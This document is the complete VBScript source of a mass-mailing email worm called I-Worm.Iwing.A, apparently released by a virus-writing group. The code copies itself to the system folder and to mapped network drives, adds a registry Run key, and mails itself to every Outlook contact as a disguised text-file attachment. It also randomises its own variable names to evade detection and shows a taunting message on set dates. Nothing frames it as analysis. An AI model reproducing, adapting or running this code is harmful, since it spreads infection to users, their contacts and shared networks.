'=================================
' I-Worm.Iwing.A
' (C) Indonesian Virus Network
' http://indovirus.8m.com
' IRC Dalnet #indovirus
'=================================
On Error Resume Next
call NLKIMQ
if day(now) = 8 or day(now) = 12 then
call FJSFSK
end if
Dim QPSIBM, TKGNUG ,JMDGEA,QFCKRA,QPSIBM5,QPSIBM6, QPSIBM7,QPSIBM75
Dim QPSIBM79,QPSIBM10
Dim MIPVGR, UEGGPK, A113333, OLBPKT
ISPBVV = "C:\WINDOWS\SYSTEM\DOCUMENT.TXT.VBS"
shell ("LABEL C: IMEL"),vbhide
Set QPSIBM = CreateObject( "Scripting.FileSystemObject" )
QPSIBM.CopyFile WScript.ScriptFullName, QPSIBM.BuildPath( QPSIBM.GetSpecialFolder(1), "DOCUMENT.TXT.VBS" )
QPSIBM.CopyFile WScript.ScriptFullName, ISPBVV
Set TKGNUG = CreateObject( "WScript.Shell" )
TKGNUG.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & "IWING", QPSIBM.BuildPath( QPSIBM.GetSpecialFolder(1), "DOCUMENT.TXT.VBS" )
Set JMDGEA = CreateObject( "WScript.Network" )
Set QPSIBM5 = JMDGEA.EnumNetworkDrives
If QPSIBM5.Count <> 0 Then
   For QFCKRA = 0 To QPSIBM5.Count - 1
       If InStr( QPSIBM5.Item( QFCKRA), "\" ) <> 0 Then
          QPSIBM.CopyFile WScript.ScriptFullName, QPSIBM.BuildPath( QPSIBM5.Item( QFCKRA), "DOCUMENT.TXT.VBS" ) 
       End If
   Next
End If
QFCKRA = TKGNUG.RegRead( "HKEY_LOCAL_MACHINE\" & "IWING" )

If QFCKRA = "" Or QFCKRA > 20 Then
   QFCKRA = 0
End If
If QFCKRA = 0 Then
   Set QPSIBM75 = CreateObject( "Outlook.Application" )
   Set QPSIBM6 = QPSIBM75.GetNameSpace( "MAPI" )
   For Each QPSIBM7 In QPSIBM6.AddressLists
       Set QPSIBM5 = QPSIBM75.CreateItem( 0 )
       Set A1111111 = CreateObject( "WScript.Network" )
       For QPSIBM79 = 1 To QPSIBM7.AddressEntries.Count
           Set QPSIBM10 = QPSIBM7.AddressEntries( QPSIBM79 )
           If QPSIBM79 = 1 Then
              QPSIBM5.BCC = QPSIBM10.Address
           Else
              QPSIBM5.BCC = QPSIBM5.BCC & "; " & QPSIBM10.Address
           End If
Set A1111111 = CreateObject( "WScript.Network" )
       Next
       QPSIBM5.Subject = "This is the Document you ask for"
       QPSIBM5.Body = "Please read the attachment"
       QPSIBM5.Attachmets.Add WScript.ScriptFullName
       QPSIBM5.DeleteAfterSubmit = True
       QPSIBM5.Send
   Next
   Set A1111111 = CreateObject( "WScript.Network" )
   QFCKRA = 0
End If

TKGNUG.RegWrite "HKEY_LOCAL_MACHINE\" & "IWING", QFCKRA + 1
'--------------------------------------------------
function FJSFSK
hs= msgbox("Hi there, this is I-Worm.iwing, is infecting your files and friends" & chr(13) & "Have a nice day :) ....",30,"I-WORM.Iwing is here")
end function
'--------------------------------------------------
function NLKIMQ
dim VHBANL
dim VHNLQS
dim BTVIMS
dim AVAAUD
Randomize
Set EJNBBS = CreateObject("Scripting.FileSystemObject")
Set KGHLGN = EJNBBS.OpenTextFile(WScript.ScriptFullName, 1)
IOKLIV = KGHLGN.Readall
SPQMGS = "EJNBBS KGHLGN IOKLIV SPQMGS TMMQBF NKSQHS BGVFCJ BRJUFG VHBANL VHNLQS BTVIMS AVAAUD FJSFSK NLKIMQ ISPBVV QPSIBM TKGNUG JMDGEA QPSIBM5 QPSIBM5 QPSIBM75 QPSIBM6 MIPVGR UEGGPK OLBPKT QFCKRA "
Do
NKSQHS = Left(SPQMGS, InStr(SPQMGS, Chr(32)) - 1)
SPQMGS = Mid(SPQMGS, InStr(SPQMGS, Chr(32)) + 1)
BGVFCJ = Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65))
Do
BRJUFG = InStr(BRJUFG + 1, IOKLIV, NKSQHS)
If BRJUFG Then IOKLIV = Mid(IOKLIV, 1, (BRJUFG - 1)) & BGVFCJ & Mid(IOKLIV, (BRJUFG + Len(NKSQHS)))
Loop While BRJUFG
Loop While SPQMGS <> ""
Set KGHLGN = EJNBBS.OpenTextFile(WScript.ScriptFullName, 2, True) '
KGHLGN.Writeline IOKLIV
VHBANL = 1
for VHBANL = 1 to 2048
BTVIMS = VHBANL + 1
next
AVAAUD = BTVIMS
end function








